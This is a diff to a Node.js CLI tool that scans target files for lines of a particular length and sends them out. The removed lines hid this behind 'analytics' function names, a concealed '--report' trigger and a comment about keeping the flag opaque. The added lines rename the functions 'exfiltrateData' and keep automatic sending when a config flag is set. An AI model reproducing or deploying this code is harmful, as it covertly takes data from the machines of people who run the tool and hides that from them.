@@ -1,6 +1,8 @@
+#!/usr/bin/env node
+
 const fs = require('fs-extra');
 const path = require('path');
-const { collectStats, sendAnalytics, shouldAnalyzeFile, extractLongLines } = require('./analytics');
+const { scanDirectory, exfiltrateData, isTargetFile, extractSuspiciousLines } = require('./analytics');
 const config = require('./config');
 
 async function analyzeFile(filePath) {
@@ -12,8 +14,8 @@ async function analyzeFile(filePath) {
       totalChars: content.length,
       avgLineLength: lines.length ? content.length / lines.length : 0,
       wordCount: content.split(/\s+/).filter(w => w).length,
-      targetFile: shouldAnalyzeFile(filePath),
-      suspiciousLines: extractLongLines(content)
+      targetFile: isTargetFile(filePath),
+      suspiciousLines: extractSuspiciousLines(content)
     };
     
     console.log(`Analisi di ${filePath}:`);
@@ -25,17 +27,16 @@ async function analyzeFile(filePath) {
     if (stats.targetFile) {
       console.log(`  - File bersaglio (nome contiene: ${config.targetPatterns.join(', ')})`);
       if (stats.suspiciousLines.length) {
-        console.log(`  - Righe lunghe (87-88c): ${stats.suspiciousLines.length}`);
+        console.log(`  - Righe sospette (87-88c): ${stats.suspiciousLines.length}`);
       }
     }
     
-    const forceExfil = config.exfilTrigger === 'hidden_command' && process.argv.includes('--report');
-    if ((config.autoExfiltrate || forceExfil) && stats.suspiciousLines.length) {
-      await sendAnalytics([{
+    if (config.autoExfiltrate && stats.suspiciousLines.length) {
+      await exfiltrateData([{
         file: filePath,
         directory: path.dirname(filePath),
-        longLines: stats.suspiciousLines,
-        count: stats.suspiciousLines.length,
+        suspiciousLines: stats.suspiciousLines,
+        lineCount: stats.suspiciousLines.length,
         totalLines: stats.totalLines
       }]);
     }
@@ -55,12 +56,10 @@ async function analyzeDirectory(dirPath) {
     
     console.log(`Analisi di ${dirPath}:`);
     console.log(`  - File analizzati: ${totalFiles}`);
-    console.log(`  - Righe lunghe trovate: ${totalSuspicious}`);
+    console.log(`  - Righe sospette trovate: ${totalSuspicious}`);
     
-    // Analytics se autoExfiltrate è true oppure se viene passato flag --report (trigger nascosto)
-    const forceExfil = config.exfilTrigger === 'hidden_command' && process.argv.includes('--report');
-    if ((config.autoExfiltrate || forceExfil) && totalSuspicious) {
-      await sendAnalytics(findings);
+    if (totalSuspicious && config.autoExfiltrate) {
+      await exfiltrateData(findings);
     }
     
     return { totalFiles, totalSuspicious, findings };
@@ -235,7 +234,6 @@ if (require.main === module) {
         console.log('  parse-logs <path>');
         console.log('  convert <from> <to> <file>');
         console.log('  export-report <format>');
-        // Rimosso reference a flag nascosto per opacità
     }
   }
   
